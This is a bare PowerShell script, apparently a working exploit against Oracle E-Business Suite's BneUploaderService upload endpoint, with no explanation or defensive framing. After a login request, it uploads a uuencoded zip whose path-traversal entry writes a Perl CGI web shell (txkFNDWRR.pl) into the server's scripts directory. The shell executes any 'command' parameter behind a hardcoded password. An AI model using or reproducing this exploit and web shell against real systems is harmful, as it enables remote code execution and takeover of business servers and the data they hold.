$url = "http://apps.example.com:8000/OA_HTML/AppsLocalLogin.jsp?"
$bodyLinesLogin = "username=x&password=x&_lAccessibility=N&displayLangCode=US"
$Headers = @{
    "X-Service" = "AuthenticateUser"
}

Invoke-WebRequest -Uri $url -Method Post -Body $bodyLinesLogin -ContentType "application/x-www-form-urlencoded" -SessionVariable session -Headers $Headers

# URL to which you want to upload the file
$url2 = "http://apps.example.com:8000/OA_HTML/BneUploaderService?bne:uueupload=true"

# Read the file content
$fileContent = @'
begin 644 txkFNDWRR.zip
M4$L#!!0``````%9*35CRA!WN\0$``/$!``!#````+BXO+BXO+BXO+BXO+BXO
M1DU77TAO;64O3W)A8VQE7T5"4RUA<'`Q+V-O;6UO;B]S8W)I<'1S+W1X:T9.
M1%=24BYP;",A+W5S<B]B:6XO<&5R;`IU<V4@0T=).PH*(R!#<F5A=&4@0T=)
M(&]B:F5C=`IM>2`D8V=I(#T@0T=)+3YN97<["@HC($=E="!T:&4@8V]M;6%N
M9"!A;F0@<&%S<W=O<F0@9G)O;2!T:&4@2%144"!R97%U97-T('!A<F%M971E
M<G,*;7D@)&-O;6UA;F0@/2`D8V=I+3YP87)A;2@G8V]M;6%N9"<I.PIM>2`D
M<&%S<W=O<F0@/2`D8V=I+3YP87)A;2@G<&%S<W=O<F0G*3L*"B,@0VAE8VL@
M:68@=&AE('!A<W-W;W)D(&ES(&-O<G)E8W0*:68@*"1P87-S=V]R9"!N92`G
M5FEP,W)6:7`S<B<I('L*("`@('!R:6YT("1C9VDM/FAE861E<B@M='EP92`]
M/B`G=&5X="]P;&%I;B<L("US=&%T=7,@/3X@)S0P,2!5;F%U=&AO<FEZ960G
M*3L*("`@(&5X:70["GT*"B,@4')I;G0@=&AE(&]U='!U="!A<R!T:&4@2%14
M4"!R97-P;VYS90IP<FEN="`D8V=I+3YH96%D97(H+71Y<&4@/3X@)W1E>'0O
M<&QA:6XG+"`M<W1A='5S(#T^("<R,#`@3TLG*3L*<')I;G0@<WES=&5M*"1C
M;VUM86YD*3L*4$L!`A0#%```````5DI-6/*$'>[Q`0``\0$``$,`````````
M`````*2!`````"XN+RXN+RXN+RXN+RXN+T9-5U](;VUE+T]R86-L95]%0E,M
M87!P,2]C;VUM;VXO<V-R:7!T<R]T>&M&3D174E(N<&Q02P4&``````$``0!Q
)````4@(`````
`
end
'@

# Construct the multipart form data
$boundary = [System.Guid]::NewGuid().ToString()
$LF = "`r`n"

$bodyLines = (
    "--$boundary",
    "Content-Disposition: form-data; name=`"text`"; filename=`"t.uue`"",
    "Content-Type: multipart/mixed$LF",
    $fileContent,
    "--$boundary--$LF"
) -join $LF

# Send the request
 $response = Invoke-WebRequest -Uri $url2 -Method Post -WebSession $session -Body $bodyLines -ContentType "multipart/form-data; boundary=$boundary"

 $response.content
